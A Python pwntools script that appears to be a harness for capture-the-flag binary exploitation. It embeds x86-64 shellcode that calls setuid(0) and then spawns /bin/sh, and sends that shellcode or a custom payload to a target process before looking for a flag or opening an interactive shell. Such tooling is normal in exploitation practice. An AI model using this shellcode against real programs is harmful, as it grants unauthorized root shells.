#!/bin/python

from pwn import *
import actions
import IPython
import importlib
import argparse
import sys
import os

context.arch = 'amd64'

BUFFER_SIZE=0x78

binsh = f'''
    mov eax, 0x69
    xor edi, edi
    syscall

    mov eax, 0x3B
    lea rdi, [rip + binsh]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    binsh:
        .string "/bin/sh"
'''


def get_module(filename):
    if not os.path.exists(filename) or filename[-3:] != '.py':
        print('invalid filename in get_module()')
        exit(1)
    if filename.find('/') == -1:
        filename = './' + filename

    mod_basename = os.path.basename(filename)[:-3]
    spec   = importlib.util.spec_from_file_location(\
                            mod_basename, filename)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    return module


def get_payload_manually(args: argparse.Namespace):
    args.payload = None
    IPython.embed(header='Specify args.payload manualy:')

    if args.payload is None:
        print('No payload given...')
    else:
        print(f"The specified payload: {args.payload}")

    return args.payload


def update_shellcode(args, shellcode):
    args.shellcode_str = shellcode
    args.shellcode_asm = asm(shellcode)

    if args.verbose:
        print("Updated shellcode: \n" + str(args.shellcode_str))
        print(f"Asm length: {len(args.shellcode_asm)} bytes\n")


def proceed(msg=None, invert=False):
    if msg is not None:
        print(msg)

    try:
        if not invert:
            return True if 'n' not in input("[Y/n]: ").lower() else False
        return False if 'y' not in input("[y/N]: ").lower() else True
    except KeyboardInterrupt as _:
        exit(0)


act_arr = {}

def main():
    parser = argparse.ArgumentParser(usage="Usage: ./script.py [binary]")
    parser.add_argument('binary')
    parser.add_argument('-v', "--verbose", action='store_true')
    parser.add_argument('-q', "--dont_ask" , action='store_true')
    parser.add_argument('-ll', "--log-level", default='warn', type=str)

    parser.add_argument('-sc', "--shellcode", nargs='?', const='\x00', type=str)
    parser.add_argument('-od', "--objdump" , action='store_true')
    parser.add_argument('-bs', "--buff-size" , type=int, default=-1)
    parser.add_argument('-ss', "--stack-size" , type=int, default=-1)
    parser.add_argument('-c', "--canary" , nargs='?', const='', type=str)
    parser.add_argument('-p', "--payload", nargs='?', const='\x00', type=str)

    parser.add_argument('-dc', "--debug-shellcode", action='store_true')
    parser.add_argument('-dp', "--debug-program", action='store_true')
    parser.add_argument('-sr', "--strace-root", action='store_true')
    parser.add_argument('-st', "--strace" , action='store_true')

    args = parser.parse_args()  

    args_cpy = vars(args).copy()

    context.log_level = args.log_level

    for arg,val in args_cpy.items():
        if not val:
            continue
        try:
            act_arr[arg] = getattr(actions, arg)
        except AttributeError as e:
            act_arr[arg] = lambda x : x
            continue

        act_arr[arg](args)


    while True:
        if not args.dont_ask:
            if proceed("Exit?", invert=True):
                exit(0)

        if args.payload:
            if args.payload_mod:
                try:
                    args.payload_mod.send_in_payload(args.payload, args.proc)
                except Exception as e:
                    print(e)
                    IPython.embed(header="send in payload")
            else:
                args.proc.sendline(str(len(args.payload)).encode())
                args.proc.send(args.payload)
        else:
            args.proc.send(args.shellcode_asm)

        try:
            args.proc.recvuntil(FLAG)
            print('Flag: ' + str(args.proc.recvline()))
            if proceed("Exit?"):
                break
        except: 
            pass

        rc = args.proc.poll()
        if not rc:
            args.proc.interactive()
        else:
            print('Rc: ' + str(rc))

        for func in act_arr.values():
            pass
            #func(args_cpy)
        
        exit(0)

if __name__ == '__main__':
    main()
